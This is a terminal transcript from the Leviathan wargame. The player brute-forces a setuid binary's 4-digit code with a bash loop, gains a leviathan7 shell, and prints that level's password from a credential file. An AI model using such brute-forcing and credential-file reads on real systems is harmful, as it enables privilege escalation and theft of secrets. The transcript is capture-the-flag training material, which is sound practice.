leviathan6@leviathan:~$ ls -alh
total 28K
drwxr-xr-x  2 root       root       4.0K Aug 26  2019 .
drwxr-xr-x 10 root       root       4.0K Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 7.3K Aug 26  2019 leviathan6
-rw-r--r--  1 root       root        675 May 15  2017 .profile

leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>


leviathan6@leviathan:~$ for i in {0000..9999}; do ./leviathan6 $i; done


$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9